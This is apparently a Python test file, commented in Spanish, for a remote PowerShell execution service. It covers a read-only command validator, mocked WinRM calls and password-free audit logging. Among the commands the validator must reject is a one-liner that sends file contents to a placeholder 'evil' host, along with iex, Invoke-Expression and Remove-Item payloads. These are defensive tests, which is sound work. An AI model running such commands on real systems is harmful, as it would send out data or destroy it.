"""tests/test_plan105_remote_exec_service.py — Plan 105 F1.

Tests del servicio remote_exec (validador read-only + WinRM + auditoría).
Subprocess SIEMPRE mockeado; keyring/fs mockeados.
"""
from __future__ import annotations

import hashlib
import json
import subprocess
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from unittest import mock

import pytest

import services.remote_exec as _remote_exec


class TestF1ReadOnlyValidator:
    """F1 — Tests del validador is_read_only_command."""

    def test_f1_read_only_accepts_get_pipeline(self):
        """Acepta pipeline de lectura: Get-ChildItem | Sort-Object | Select-Object."""
        cmd = "Get-ChildItem D:\\x | Sort-Object Name | Select-Object -First 5"
        assert _remote_exec.is_read_only_command(cmd) is True

    def test_f1_read_only_accepts_aliases(self):
        """Acepta aliases de lectura: dir, type, Get-Content."""
        assert _remote_exec.is_read_only_command("dir C:\\") is True
        assert _remote_exec.is_read_only_command("type foo.log") is True
        assert _remote_exec.is_read_only_command("Get-Content x -Tail 50") is True

    def test_f1_read_only_rejects_mutants(self):
        """Rechaza verbos mutantes y redirecciones peligrosas."""
        tests = [
            "Remove-Item x",
            "Get-Item x; Remove-Item x",
            "Get-Content x | Out-File y",
            "Get-Process > p.txt",
            "Invoke-Expression $c",
            "iex $c",
            "Restart-Computer",
            "schtasks /delete /tn x",
        ]
        for cmd in tests:
            assert _remote_exec.is_read_only_command(cmd) is False, f"debió rechazar: {cmd}"

    def test_f1_read_only_rejects_scriptblock_vectors(self):
        """C3 (v2): rechaza vectores de ejecución arbitraria con bloques { }."""
        # Llaves → RECHAZO (vector clásico de method .NET arbitrario)
        assert _remote_exec.is_read_only_command("Get-Content x | %{ & $_ }") is False
        assert _remote_exec.is_read_only_command("Get-ChildItem | ForEach-Object { $_.Delete() }") is False
        assert _remote_exec.is_read_only_command("Get-Content x | %{ Invoke-WebRequest http://evil/$_ }") is False
        assert _remote_exec.is_read_only_command("Get-Item x | %{ iex $_ }") is False
        assert _remote_exec.is_read_only_command("Get-Process | Where-Object { Stop-Process $_ }") is False

        # Call operator & + .Invoke
        assert _remote_exec.is_read_only_command("& (Get-Command Remove-Item)") is False

        # Exfiltration tools (iwr/irm/curl/wget)
        assert _remote_exec.is_read_only_command("Get-Content x | iwr") is False
        assert _remote_exec.is_read_only_command("Get-Foo; Start-Process calc") is False
        assert _remote_exec.is_read_only_command("Get-Content x | Add-Type -Path $_") is False

    def test_f1_read_only_rejects_unknown_first_verb(self):
        """Rechaza verbo desconocido (no en allowlist)."""
        assert _remote_exec.is_read_only_command("Invoke-WebRequest http://x") is False


class TestF1RunRemote:
    """F1 — Tests de run_remote con mocks."""

    @contextmanager
    def _mock_flag_on(self):
        """Helper para mockear flag ON en los tests."""
        import config as _config
        with mock.patch.object(_config.config, "STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED", True):
            with mock.patch.object(_config.config, "STACKY_DEVOPS_SERVERS_ENABLED", True):
                with mock.patch("sys.platform", "win32"):
                    yield

    def test_f1_run_remote_read_only_blocks_and_audits(self, tmp_path, monkeypatch):
        """mode read_only + comando mutante ⇒ ok=False, error=command_not_read_only."""
        # Mock filesystem
        monkeypatch.setattr(_remote_exec, "_audit_dir", lambda: tmp_path)

        with self._mock_flag_on():
            with mock.patch("services.remote_exec.subprocess.run"):
                result = _remote_exec.run_remote(
                    "srv1", "Remove-Item x", mode="read_only", conversation_id=123, user="test"
                )

        assert result["ok"] is False
        assert result["error"] == "command_not_read_only"
        assert result["exit_code"] is None

        # Verificar que se audita el rechazo
        audit_file = tmp_path / "srv1.jsonl"
        assert audit_file.exists()
        lines = audit_file.read_text(encoding="utf-8").splitlines()
        assert len(lines) == 1
        entry = json.loads(lines[0])
        assert entry["kind"] == "exec"
        assert entry["ok"] is False
        assert entry["error"] == "command_not_read_only"

    def test_f1_run_remote_success_audits_hash(self, tmp_path, monkeypatch):
        """subprocess mock exit 0 ⇒ ok con stdout; auditoría tiene hash, NO stdout."""
        monkeypatch.setattr(_remote_exec, "_audit_dir", lambda: tmp_path)

        mock_result = mock.Mock()
        mock_result.stdout = "hola"
        mock_result.stderr = ""
        mock_result.returncode = 0

        with self._mock_flag_on():
            with mock.patch("services.server_registry.get_credential", return_value=("user", "pass", "host")):
                with mock.patch("services.remote_exec.subprocess.run", return_value=mock_result):
                    result = _remote_exec.run_remote(
                        "srv1", "Get-ChildItem", mode="read_only", conversation_id=456, user="test"
                    )

        assert result["ok"] is True
        assert result["stdout"] == "hola"

        # Auditoría: hash presente, stdout NO
        audit_file = tmp_path / "srv1.jsonl"
        entry = json.loads(audit_file.read_text(encoding="utf-8").splitlines()[0])
        assert entry["stdout_sha256"] == hashlib.sha256(b"hola").hexdigest()
        assert "stdout" not in entry
        assert entry["ok"] is True

    def test_f1_password_never_in_audit_nor_args(self, tmp_path, monkeypatch):
        """KPI-5: password SOLO en env del subprocess, nunca en args ni JSONL."""
        monkeypatch.setattr(_remote_exec, "_audit_dir", lambda: tmp_path)

        captured_env = {}
        captured_args = []

        def fake_run(*args, env=None, **kwargs):
            captured_args.extend(args[0])  # argv[0] es la lista de comandos
            captured_env.update(env or {})
            mock_result = mock.Mock()
            mock_result.stdout = "output"
            mock_result.stderr = ""
            mock_result.returncode = 0
            return mock_result

        with self._mock_flag_on():
            with mock.patch("services.remote_exec.subprocess.run", side_effect=fake_run):
                with mock.patch("services.server_registry.get_credential", return_value=("user", "S3cr3t!", "host")):
                    _remote_exec.run_remote("srv1", "Get-Process", mode="write", user="test")

        # Password en env, NO en args
        assert "SR_PASS" in captured_env
        assert captured_env["SR_PASS"] == "S3cr3t!"
        assert "S3cr3t!" not in str(captured_args)

        # JSONL NO contiene password
        audit_json = (tmp_path / "srv1.jsonl").read_text(encoding="utf-8")
        assert "S3cr3t!" not in audit_json
        assert "SR_PASS" not in audit_json

    def test_f1_run_remote_flag_off(self, tmp_path, monkeypatch):
        """flag OFF ⇒ error=remote_exec_disabled sin subprocess."""
        monkeypatch.setattr(_remote_exec, "_audit_dir", lambda: tmp_path)
        with mock.patch("config.config.STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED", False):
            result = _remote_exec.run_remote("srv1", "Get-Process", mode="read_only")

        assert result["ok"] is False
        assert result["error"] == "remote_exec_disabled"

    def test_f1_run_remote_non_windows(self, tmp_path, monkeypatch):
        """sys.platform != "win32" ⇒ error=remote_exec_windows_only."""
        monkeypatch.setattr(_remote_exec, "_audit_dir", lambda: tmp_path)

        import config as _config
        with mock.patch.object(_config.config, "STACKY_DEVOPS_REMOTE_CONSOLE_ENABLED", True):
            with mock.patch("sys.platform", "linux"):
                result = _remote_exec.run_remote("srv1", "Get-Process", mode="read_only")

        assert result["ok"] is False
        assert result["error"] == "remote_exec_windows_only"

    def test_f1_timeout_generic_error(self, tmp_path, monkeypatch):
        """TimeoutExpired ⇒ error=timeout, mensaje fijo sin repr del argv."""
        monkeypatch.setattr(_remote_exec, "_audit_dir", lambda: tmp_path)

        with self._mock_flag_on():
            with mock.patch("services.server_registry.get_credential", return_value=("user", "pass", "host")):
                with mock.patch("services.remote_exec.subprocess.run", side_effect=subprocess.TimeoutExpired("cmd", 120)):
                    result = _remote_exec.run_remote("srv1", "Get-Process", mode="read_only")

        assert result["ok"] is False
        assert result["error"] == "timeout"

    def test_f1_audit_read_most_recent_first(self, tmp_path, monkeypatch):
        """append_audit → read_audit devuelve invertidos (más recientes primero)."""
        monkeypatch.setattr(_remote_exec, "_audit_dir", lambda: tmp_path)

        _remote_exec.append_audit("srv1", {"seq": 1})
        _remote_exec.append_audit("srv1", {"seq": 2})
        _remote_exec.append_audit("srv1", {"seq": 3})

        rows = _remote_exec.read_audit("srv1", limit=10)
        assert [r["seq"] for r in rows] == [3, 2, 1]

    def test_f1_check_winrm_non_windows(self, monkeypatch):
        """C3 (v2): sys.platform != "win32" ⇒ check_winrm devuelve windows_only."""
        with mock.patch("sys.platform", "linux"):
            result = _remote_exec.check_winrm("srv1")

        assert result["ok"] is False
        assert result["detail"] == "windows_only"

    def test_f1_no_remote_exec_bypass(self):
        """KPI-2: Invoke-Command aparece SOLO en remote_exec_invoke.ps1."""
        ps1_path = Path("services/remote_exec_invoke.ps1")
        assert ps1_path.exists()
        ps1_content = ps1_path.read_text(encoding="utf-8")
        assert "Invoke-Command" in ps1_content
        assert "-ComputerName" in ps1_content

        # Verificar que services/remote_exec.py NO tiene Invoke-Command real
        # (solo en docstring/regex, no como código ejecutable)
        remote_exec_py = Path("services/remote_exec.py")
        remote_exec_content = remote_exec_py.read_text(encoding="utf-8")
        # Buscar líneas que NO sean comentarios ni strings
        lines_with_invoke = []
        for i, line in enumerate(remote_exec_content.splitlines(), 1):
            if "Invoke-Command" in line and not line.strip().startswith("#") and not '"' in line:
                lines_with_invoke.append(f"linea {i}: {line}")
        # Debe estar vacío (Invoke-Command solo en comentarios/docstrings)
        assert len(lines_with_invoke) == 0, f"Invoke-Command en código ejecutable: {lines_with_invoke}"


class TestF1AuditIntegrity:
    """F1 — Tests de integridad de auditoría."""

    def test_f1_audit_tolerates_corrupt_lines(self, tmp_path, monkeypatch):
        """Líneas corruptas en JSONL se saltan."""
        monkeypatch.setattr(_remote_exec, "_audit_dir", lambda: tmp_path)

        _remote_exec.append_audit("srv1", {"seq": 1})
        # Agregar línea corrupta
        (tmp_path / "srv1.jsonl").write_text(
            (tmp_path / "srv1.jsonl").read_text() + "\n{invalid json\n",
            encoding="utf-8",
        )
        _remote_exec.append_audit("srv1", {"seq": 2})

        rows = _remote_exec.read_audit("srv1", limit=10)
        assert len(rows) == 2  # línea corrupta salteada
        assert [r["seq"] for r in rows] == [2, 1]

    def test_f1_audit_nonexistent_alias_empty(self):
        """read_audit con alias inexistente ⇒ [] (no error)."""
        # Crear alias válido primero
        from services.server_registry import validate_alias
        if validate_alias("nonexistent"):
            rows = _remote_exec.read_audit("nonexistent")
            assert rows == []
